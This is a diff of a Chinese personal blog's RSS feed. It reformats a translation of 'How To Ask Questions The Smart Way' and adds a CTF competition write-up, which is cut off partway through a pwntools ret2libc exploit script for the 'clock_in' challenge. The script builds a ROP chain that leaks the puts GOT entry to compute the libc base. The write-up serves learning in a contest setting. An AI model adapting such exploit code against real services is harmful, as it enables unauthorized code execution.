@@ -103,14 +103,11 @@
 &lt;/h3>&lt;p>在邮件列表、新闻群组或论坛中，大约 50 字以内的标题是抓住资深专家注意力的好机会。别用喋喋不休的&lt;code>帮帮忙&lt;/code>、&lt;code>跪求&lt;/code>、&lt;code>急&lt;/code>（更别说&lt;code>救命啊！！！！&lt;/code>这样让人反感的话，用这种标题会被条件反射式地忽略）来浪费这个机会。不要妄想用你的痛苦程度来打动我们，而是在这点空间中使用极简单扼要的描述方式来提出问题。&lt;/p>
 &lt;p>一个好标题范例是&lt;code>目标 -- 差异&lt;/code>式的描述，许多技术支持组织就是这样做的。在&lt;code>目标&lt;/code>部分指出是哪一个或哪一组东西有问题，在&lt;code>差异&lt;/code>部分则描述与期望的行为不一致的地方。&lt;/p>
 &lt;blockquote>
-&lt;p>蠢问题：救命啊！我的笔电不能正常显示了！&lt;/p>
-&lt;/blockquote>
+&lt;p>蠢问题：救命啊！我的笔电不能正常显示了！&lt;/p>&lt;/blockquote>
 &lt;blockquote>
-&lt;p>聪明问题：X.org 6.8.1 的鼠标游标会变形，某牌显卡 MV1005 芯片组。&lt;/p>
-&lt;/blockquote>
+&lt;p>聪明问题：X.org 6.8.1 的鼠标游标会变形，某牌显卡 MV1005 芯片组。&lt;/p>&lt;/blockquote>
 &lt;blockquote>
-&lt;p>更聪明问题：X.org 6.8.1 的鼠标游标，在某牌显卡 MV1005 芯片组环境下 - 会变形。&lt;/p>
-&lt;/blockquote>
+&lt;p>更聪明问题：X.org 6.8.1 的鼠标游标，在某牌显卡 MV1005 芯片组环境下 - 会变形。&lt;/p>&lt;/blockquote>
 &lt;p>编写&lt;code>目标 -- 差异&lt;/code> 式描述的过程有助于你组织对问题的细致思考。是什么被影响了？ 仅仅是鼠标游标或者还有其它图形？只在 X.org 的 X 版中出现？或只是出现在 6.8.1 版中？ 是针对某牌显卡芯片组？或者只是其中的 MV1005 型号？ 一个黑客只需瞄一眼就能够立即明白你的环境 &lt;strong>&lt;em>和&lt;/em>&lt;/strong> 你遇到的问题。&lt;/p>
 &lt;p>总而言之，请想像一下你正在一个只显示标题的存档讨论串（Thread）索引中查寻。让你的标题更好地反映问题，可使下一个搜索类似问题的人能够关注这个讨论串，而不用再次提问相同的问题。&lt;/p>
 &lt;p>如果你想在回复中提出问题，记得要修改内容标题，以表明你是在问一个问题， 一个看起来像 &lt;code>Re: 测试&lt;/code> 或者 &lt;code>Re: 新 bug&lt;/code> 的标题很难引起足够重视。另外，在不影响连贯性之下，适当引用并删减前文的内容，能给新来的读者留下线索。&lt;/p>
@@ -133,29 +130,25 @@
 &lt;p>如果英文是你的外语（Second language），提示潜在回复者你有潜在的语言困难是很好的：
 [译注：以下附上原文以供使用]&lt;/p>
 &lt;blockquote>
-&lt;p>English is not my native language; please excuse typing errors.&lt;/p>
-&lt;/blockquote>
+&lt;p>English is not my native language; please excuse typing errors.&lt;/p>&lt;/blockquote>
 &lt;ul>
 &lt;li>英文不是我的母语，请原谅我的错字或语法&lt;/li>
 &lt;/ul>
 &lt;blockquote>
 &lt;p>If you speak $LANGUAGE, please email/PM me;
-I may need assistance translating my question.&lt;/p>
-&lt;/blockquote>
+I may need assistance translating my question.&lt;/p>&lt;/blockquote>
 &lt;ul>
 &lt;li>如果你说&lt;strong>某语言&lt;/strong>，请寄信/私讯给我；我需要有人协助我翻译我的问题&lt;/li>
 &lt;/ul>
 &lt;blockquote>
 &lt;p>I am familiar with the technical terms,
-but some slang expressions and idioms are difficult for me.&lt;/p>
-&lt;/blockquote>
+but some slang expressions and idioms are difficult for me.&lt;/p>&lt;/blockquote>
 &lt;ul>
 &lt;li>我对技术名词很熟悉，但对于俗语或是特别用法比较不甚了解。&lt;/li>
 &lt;/ul>
 &lt;blockquote>
 &lt;p>I&amp;rsquo;ve posted my question in $LANGUAGE and English.
-I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.&lt;/p>
-&lt;/blockquote>
+I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.&lt;/p>&lt;/blockquote>
 &lt;ul>
 &lt;li>我把我的问题用&lt;strong>某语言&lt;/strong>和英文写出来，如果你只用一种语言回答，我会乐意将其翻译成另一种。&lt;/li>
 &lt;/ul>
@@ -207,15 +200,13 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
 &lt;p>&lt;em>&lt;strong>蠢问题&lt;/strong>&lt;/em>&lt;/p>
 &lt;blockquote>
 &lt;p>我在编译内核时接连遇到 SIG11 错误，
-我怀疑某条飞线搭在主板的走线上了，这种情况应该怎样检查最好？&lt;/p>
-&lt;/blockquote>
+我怀疑某条飞线搭在主板的走线上了，这种情况应该怎样检查最好？&lt;/p>&lt;/blockquote>
 &lt;p>&lt;em>&lt;strong>聪明问题&lt;/strong>&lt;/em>&lt;/p>
 &lt;blockquote>
 &lt;p>我的组装电脑是 FIC-PA2007 主机板搭载 AMD K6/233 CPU（威盛 Apollo VP2 芯片组），
 256MB Corsair PC133 SDRAM 内存，在编译内核时，从开机 20 分钟以后就频频产生 SIG11 错误，
 但是在头 20 分钟内从没发生过相同的问题。重新启动也没有用，但是关机一晚上就又能工作 20 分钟。
-所有内存都换过了，没有效果。相关部分的标准编译记录如下…。&lt;/p>
-&lt;/blockquote>
+所有内存都换过了，没有效果。相关部分的标准编译记录如下…。&lt;/p>&lt;/blockquote>
 &lt;p>由于以上这点似乎让许多人觉得难以配合，这里有句话可以提醒你：&lt;code>所有的诊断专家都来自密苏里州。&lt;/code> 美国国务院的官方座右铭则是：&lt;code>让我看看&lt;/code>（出自国会议员 Willard D. Vandiver 在 1899 年时的讲话：&lt;code>我来自一个出产玉米，棉花，牛蒡和民主党人的国家，滔滔雄辩既不能说服我，也不会让我满意。我来自密苏里州，你必须让我看看。&lt;/code>） 针对诊断者而言，这并不是一种怀疑，而只是一种真实而有用的需求，以便让他们看到的是与你看到的原始证据尽可能一致的东西，而不是你的猜测与归纳的结论。所以，大方的展示给我们看吧！&lt;/p>
 &lt;h3 id="按发生时间先后列出问题症状">按发生时间先后列出问题症状
 &lt;/h3>&lt;p>问题发生前的一系列操作，往往就是对找出问题最有帮助的线索。因此，你的说明里应该包含你的操作步骤，以及机器和软件的反应，直到问题发生。在命令行处理的情况下，提供一段操作记录（例如运行脚本工具所生成的），并引用相关的若干行（如 20 行）记录会非常有帮助。&lt;/p>
@@ -226,13 +217,11 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
 &lt;p>经常寻求技术帮助的人在心中有个更高层次的目标，而他们在自以为能达到目标的特定道路上被卡住了，然后跑来问该怎么走，但没有意识到这条路本身就有问题。结果要费很大的劲才能搞定。&lt;/p>
 &lt;p>&lt;strong>蠢问题&lt;/strong>&lt;/p>
 &lt;blockquote>
-&lt;p>我怎样才能从某绘图程序的颜色选择器中取得十六进制的的 RGB 值？&lt;/p>
-&lt;/blockquote>
+&lt;p>我怎样才能从某绘图程序的颜色选择器中取得十六进制的的 RGB 值？&lt;/p>&lt;/blockquote>
 &lt;p>&lt;strong>聪明问题&lt;/strong>&lt;/p>
 &lt;blockquote>
 &lt;p>我正试着用替换一幅图片的色码（color table）成自己选定的色码，我现在知道的唯一方法是编辑每个色码区块（table slot），
-但却无法从某绘图程序的颜色选择器取得十六进制的的 RGB 值。&lt;/p>
-&lt;/blockquote>
+但却无法从某绘图程序的颜色选择器取得十六进制的的 RGB 值。&lt;/p>&lt;/blockquote>
 &lt;p>第二种提问法比较聪明，你可能得到像是&lt;code>建议采用另一个更合适的工具&lt;/code>的回复。&lt;/p>
 &lt;h3 id="别要求使用私人电邮回复">别要求使用私人电邮回复
 &lt;/h3>&lt;p>黑客们认为问题的解决过程应该公开、透明，此过程中如果更有经验的人注意到不完整或者不当之处，最初的回复才能够、也应该被纠正。同时，作为提供帮助者可以得到一些奖励，奖励就是他的能力和学识被其他同行看到。&lt;/p>
@@ -324,29 +313,24 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
 &lt;hr>
 &lt;p>&lt;a id="q1">&lt;/a>&lt;/p>
 &lt;blockquote>
-&lt;p>问题：我能在哪找到 X 程序或 X 资源？&lt;/p>
-&lt;/blockquote>
+&lt;p>问题：我能在哪找到 X 程序或 X 资源？&lt;/p>&lt;/blockquote>
 &lt;p>回答：就在我找到它的地方啊，白痴 &amp;ndash; 搜索引擎的那一头。天哪！难道还有人不会用 &lt;a class="link" href="http://www.google.com" target="_blank" rel="noopener"
 >Google&lt;/a> 吗？&lt;/p>
 &lt;p>&lt;a id="q2">&lt;/a>&lt;/p>
 &lt;blockquote>
-&lt;p>问题：我怎样用 X 做 Y？&lt;/p>
-&lt;/blockquote>
+&lt;p>问题：我怎样用 X 做 Y？&lt;/p>&lt;/blockquote>
 &lt;p>回答：如果你想解决的是 Y ，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对 Y 要解决的问题糊涂，还被特定形势禁锢了思维。最好忽略这种人，等他们把问题搞清楚了再说。&lt;/p>
 &lt;p>&lt;a id="q3">&lt;/a>&lt;/p>
 &lt;blockquote>
-&lt;p>问题：如何设定我的 shell 提示？？&lt;/p>
-&lt;/blockquote>
+&lt;p>问题：如何设定我的 shell 提示？？&lt;/p>&lt;/blockquote>
 &lt;p>回答：如果你有足够的智慧提这个问题，你也该有足够的智慧去 &lt;a class="link" href="#RTFM" >RTFM&lt;/a>，然后自己去找出来。&lt;/p>
 &lt;p>&lt;a id="q4">&lt;/a>&lt;/p>
 &lt;blockquote>
-&lt;p>问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 档案转换为 TeX 格式吗？&lt;/p>
-&lt;/blockquote>
+&lt;p>问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 档案转换为 TeX 格式吗？&lt;/p>&lt;/blockquote>
 &lt;p>回答：试试看就知道了。如果你试过，你既知道了答案，就不用浪费我的时间了。&lt;/p>
 &lt;p>&lt;a id="q5">&lt;/a>&lt;/p>
 &lt;blockquote>
-&lt;p>问题：我的{程序/设定/SQL 语句}不工作&lt;/p>
-&lt;/blockquote>
+&lt;p>问题：我的{程序/设定/SQL 语句}不工作&lt;/p>&lt;/blockquote>
 &lt;p>回答：这不算是问题吧，我对要我问你二十个问题才找得出你真正问题的问题没兴趣 &amp;ndash; 我有更有意思的事要做呢。在看到这类问题的时候，我的反应通常不外如下三种&lt;/p>
 &lt;ul>
 &lt;li>你还有什么要补充的吗？&lt;/li>
@@ -355,58 +339,48 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
 &lt;/ul>
 &lt;p>&lt;a id="q6">&lt;/a>&lt;/p>
 &lt;blockquote>
-&lt;p>问题：我的 Windows 电脑有问题，你能帮我吗？&lt;/p>
-&lt;/blockquote>
+&lt;p>问题：我的 Windows 电脑有问题，你能帮我吗？&lt;/p>&lt;/blockquote>
 &lt;p>回答：能啊，扔掉微软的垃圾，换个像 Linux 或 BSD 的开放源代码操作系统吧。&lt;/p>
 &lt;p>注意：如果程序有官方版 Windows 或者与 Windows 有互动（如 Samba），你**&lt;em>可以&lt;/em>**问与 Windows 相关的问题， 只是别对问题是由 Windows 操作系统而不是程序本身造成的回复感到惊讶， 因为 Windows 一般来说实在太烂，这种说法通常都是对的。&lt;/p>
 &lt;p>&lt;a id="q7">&lt;/a>&lt;/p>
 &lt;blockquote>
-&lt;p>问题：我的程序不会动了，我认为系统工具 X 有问题&lt;/p>
-&lt;/blockquote>
+&lt;p>问题：我的程序不会动了，我认为系统工具 X 有问题&lt;/p>&lt;/blockquote>
 &lt;p>回答：你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与函数库档案有明显缺陷的人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有清楚而详尽的缺陷说明文件作后盾。&lt;/p>
 &lt;p>&lt;a id="q8">&lt;/a>&lt;/p>
 &lt;blockquote>
-&lt;p>问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？&lt;/p>
-&lt;/blockquote>
+&lt;p>问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？&lt;/p>&lt;/blockquote>
 &lt;p>回答：不能，我只有亲自在你的电脑上动手才能找到毛病。还是去找你当地的 Linux 使用群组者寻求实际的指导吧（你能在&lt;a class="link" href="http://www.linux.org/groups/index.html" target="_blank" rel="noopener"
 >这儿&lt;/a>找到使用者群组的清单）。&lt;/p>
 &lt;p>注意：如果安装问题与某 Linux 的发行版有关，在它的邮件列表、论坛或本地使用者群组中提问也许是恰当的。此时，应描述问题的准确细节。在此之前，先用 &lt;code>Linux&lt;/code> 和 &lt;strong>&lt;em>所有&lt;/em>&lt;/strong> 被怀疑的硬件作关键词仔细搜索。&lt;/p>
 &lt;p>&lt;a id="q9">&lt;/a>&lt;/p>
 &lt;blockquote>
-&lt;p>问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？&lt;/p>
-&lt;/blockquote>
+&lt;p>问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？&lt;/p>&lt;/blockquote>
 &lt;p>回答：想要这样做，说明了你是个卑鄙小人；想找个黑客帮你，说明你是个白痴！&lt;/p>
 &lt;h2 id="好问题与蠢问题">好问题与蠢问题
 &lt;/h2>&lt;p>最后，我将透过举一些例子，来说明怎样聪明的提问；同一个问题的两种问法被放在一起，一种是愚蠢的，另一种才是明智的。&lt;/p>
 &lt;p>&lt;strong>&lt;em>蠢问题&lt;/em>&lt;/strong>：&lt;/p>
 &lt;blockquote>
-&lt;p>我可以在哪儿找到关于 Foonly Flurbamatic 的资料？&lt;/p>
-&lt;/blockquote>
+&lt;p>我可以在哪儿找到关于 Foonly Flurbamatic 的资料？&lt;/p>&lt;/blockquote>
 &lt;p>这种问法无非想得到 &lt;a class="link" href="#RTFM" >STFW&lt;/a> 这样的回答。&lt;/p>
 &lt;p>&lt;strong>&lt;em>聪明问题&lt;/em>&lt;/strong>：&lt;/p>
 &lt;blockquote>
-&lt;p>我用 Google 搜索过 &amp;ldquo;Foonly Flurbamatic 2600&amp;rdquo;，但是没找到有用的结果。谁知道上哪儿去找对这种设备编程的资料？&lt;/p>
-&lt;/blockquote>
+&lt;p>我用 Google 搜索过 &amp;ldquo;Foonly Flurbamatic 2600&amp;rdquo;，但是没找到有用的结果。谁知道上哪儿去找对这种设备编程的资料？&lt;/p>&lt;/blockquote>
 &lt;p>这个问题已经 STFW 过了，看起来他真的遇到了麻烦。&lt;/p>
 &lt;p>&lt;strong>&lt;em>蠢问题&lt;/em>&lt;/strong>&lt;/p>
 &lt;blockquote>
-&lt;p>我从 foo 项目找来的源码没法编译。它怎么这么烂？&lt;/p>
-&lt;/blockquote>
+&lt;p>我从 foo 项目找来的源码没法编译。它怎么这么烂？&lt;/p>&lt;/blockquote>
 &lt;p>他觉得都是别人的错，这个傲慢自大的提问者。&lt;/p>
 &lt;p>&lt;strong>&lt;em>聪明问题&lt;/em>&lt;/strong>&lt;/p>
 &lt;blockquote>
-&lt;p>foo 项目代码在 Nulix 6.2 版下无法编译通过。我读过了 FAQ，但里面没有提到跟 Nulix 有关的问题。这是我编译过程的记录，我有什么做的不对的地方吗？&lt;/p>
-&lt;/blockquote>
+&lt;p>foo 项目代码在 Nulix 6.2 版下无法编译通过。我读过了 FAQ，但里面没有提到跟 Nulix 有关的问题。这是我编译过程的记录，我有什么做的不对的地方吗？&lt;/p>&lt;/blockquote>
 &lt;p>提问者已经指明了环境，也读过了 FAQ，还列出了错误，并且他没有把问题的责任推到别人头上，他的问题值得被关注。&lt;/p>
 &lt;p>&lt;strong>&lt;em>蠢问题&lt;/em>&lt;/strong>&lt;/p>
 &lt;blockquote>
-&lt;p>我的主机板有问题了，谁来帮我？&lt;/p>
-&lt;/blockquote>
+&lt;p>我的主机板有问题了，谁来帮我？&lt;/p>&lt;/blockquote>
 &lt;p>某黑客对这类问题的回答通常是：&lt;code>好的，还要帮你拍拍背和换尿布吗？&lt;/code>，然后按下删除键。&lt;/p>
 &lt;p>&lt;strong>&lt;em>聪明问题&lt;/em>&lt;/strong>&lt;/p>
 &lt;blockquote>
-&lt;p>我在 S2464 主机板上试过了 X 、 Y 和 Z ，但没什么作用，我又试了 A 、 B 和 C 。请注意当我尝试 C 时的奇怪现象。显然 florbish 正在 grommicking，但结果出人意料。通常在 Athlon MP 主机板上引起 grommicking 的原因是什么？有谁知道接下来我该做些什么测试才能找出问题？&lt;/p>
-&lt;/blockquote>
+&lt;p>我在 S2464 主机板上试过了 X 、 Y 和 Z ，但没什么作用，我又试了 A 、 B 和 C 。请注意当我尝试 C 时的奇怪现象。显然 florbish 正在 grommicking，但结果出人意料。通常在 Athlon MP 主机板上引起 grommicking 的原因是什么？有谁知道接下来我该做些什么测试才能找出问题？&lt;/p>&lt;/blockquote>
 &lt;p>这个家伙，从另一个角度来看，值得去回答他。他表现出了解决问题的能力，而不是坐等天上掉答案。&lt;/p>
 &lt;p>在最后一个问题中，注意&lt;code>告诉我答案&lt;/code>和&lt;code>给我启示，指出我还应该做什么诊断工作&lt;/code>之间微妙而又重要的区别。&lt;/p>
 &lt;p>事实上，后一个问题源自于 2001 年 8 月在 Linux 内核邮件列表（lkml）上的一个真实的提问。我（Eric）就是那个提出问题的人。我在 Tyan S2464 主板上观察到了这种无法解释的锁定现象，列表成员们提供了解决这一问题的重要信息。&lt;/p>
@@ -437,7 +411,340 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
 &lt;p>当你发布软件或补丁时，试着按&lt;a class="link" href="http://en.tldp.org/HOWTO/Software-Release-Practice-HOWTO/index.html" target="_blank" rel="noopener"
 >软件发布实践&lt;/a>操作。&lt;/p>
 &lt;h2 id="鸣谢">鸣谢
-&lt;/h2>&lt;p>Evelyn Mitchel 贡献了一些愚蠢问题例子并启发了编写&lt;code>如何更好地回答问题&lt;/code>这一节， Mikhail Ramendik 贡献了一些特别有价值的建议和改进。&lt;/p></description></item><item><title>编码系列</title><link>https://XiaoYuan-420.gituhub.io/p/%E7%BC%96%E7%A0%81%E7%B3%BB%E5%88%97/</link><pubDate>Mon, 28 Oct 2024 15:43:08 +0800</pubDate><author>2024211570@bupt.cn (XiaoYuan)</author><guid>https://XiaoYuan-420.gituhub.io/p/%E7%BC%96%E7%A0%81%E7%B3%BB%E5%88%97/</guid><description>&lt;h1 id="编码系列持续更新">编码系列(持续更新)
+&lt;/h2>&lt;p>Evelyn Mitchel 贡献了一些愚蠢问题例子并启发了编写&lt;code>如何更好地回答问题&lt;/code>这一节， Mikhail Ramendik 贡献了一些特别有价值的建议和改进。&lt;/p></description></item><item><title>强网青少初赛WP</title><link>https://XiaoYuan-420.gituhub.io/p/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E5%88%9D%E8%B5%9Bwp/</link><pubDate>Wed, 27 Nov 2024 00:00:00 +0000</pubDate><author>2024211570@bupt.cn (XiaoYuan)</author><guid>https://XiaoYuan-420.gituhub.io/p/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E5%88%9D%E8%B5%9Bwp/</guid><description>&lt;h2 id="misc">Misc
+&lt;/h2>&lt;h3 id="签到漫画">签到漫画
+&lt;/h3>&lt;p>二维码拼图，扫码得到URL&lt;/p>
+&lt;p>&lt;a class="link" href="http://weixin.qq.com/r/4BIrMz7ES2M0rXpQ90fy?flag%7byouthful_and_upward%7d" target="_blank" rel="noopener"
+>http://weixin.qq.com/r/4BIrMz7ES2M0rXpQ90fy?flag{youthful_and_upward}&lt;/a>&lt;/p>
+&lt;h3 id="whitepic">whitepic
+&lt;/h3>&lt;p>后缀改为.gif 放入gif逐帧分析可得flag&lt;/p>
+&lt;h3 id="删除后门用户2">删除后门用户2
+&lt;/h3>&lt;p>题目内容：&lt;/p>
+&lt;p>本题需要选手完成风险排查：清理后门用户。当彻底清理好后，等待一分钟左右，/checklog会出现flag。&lt;/p>
+&lt;p>（本题下发后会有一个ssh地址、账号密码，选手可通过ssh来访问环境）&lt;/p>
+&lt;p>直接userdel显示进程占用&lt;/p>
+&lt;p>ps -ef查看&lt;/p>
+&lt;p>kill 22&lt;/p>
+&lt;p>kill 57 58 61&lt;/p>
+&lt;p>userdel -f backdoor&lt;/p>
+&lt;p>过一分钟拿flag&lt;/p>
+&lt;h2 id="pwn">PWN
+&lt;/h2>&lt;h3 id="clock_in">clock_in
+&lt;/h3>&lt;p>题目内容：&lt;/p>
+&lt;p>1.We wish you success and hope you enjoy this task.&lt;/p>
+&lt;p>2.The flag position is in /home/ctf/flag&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_rdi_ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x4011C5&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">call_puts_pop_ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x4011FA&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">get_info_func&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x401202&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puts_got&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x403FD8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">binsh&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x1cb42f&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">system&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x58740&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;IP&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;PORT&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># io = process(&amp;#39;./clock_in&amp;#39;)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">log_level&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;debug&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">64&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pop_rdi_ret&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">puts_got&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">call_puts_pop_ret&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">#call puts in get_info_func&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">get_info_func&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;Your info: &amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;Thank you! You entered:&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc_puts_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\0&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc_base_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc_puts_addr&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mh">0x87BD0&lt;/span>
